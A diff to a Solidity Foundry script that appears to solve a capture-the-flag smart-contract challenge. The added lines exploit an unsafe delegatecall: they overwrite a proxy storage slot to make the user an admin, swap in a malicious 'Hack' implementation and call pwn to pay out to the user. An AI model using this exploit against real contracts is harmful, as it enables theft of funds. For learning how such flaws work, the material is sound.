@@ -30,13 +30,15 @@ contract ResolutionScript is Script {
     }
 
     function solution() internal {
-        // write your solution here !
+        /* Unsafe Delegatecall: manipulate slot0 of Proxy contract and
+         * grant admin privileges to the user to meet the onlyAdmin modifier requirements
+         */
         Database(address(proxy)).write(
             uint256(uint160(address(user))),
             bytes32(uint256(uint8(1)))
         );
 
-        proxy.addAdmin(address(user));
+        // Change implementation to a malicious one
         proxy.setImplementation(address(new Hack()));
         Hack(address(proxy)).pwn(payable(user));
     }
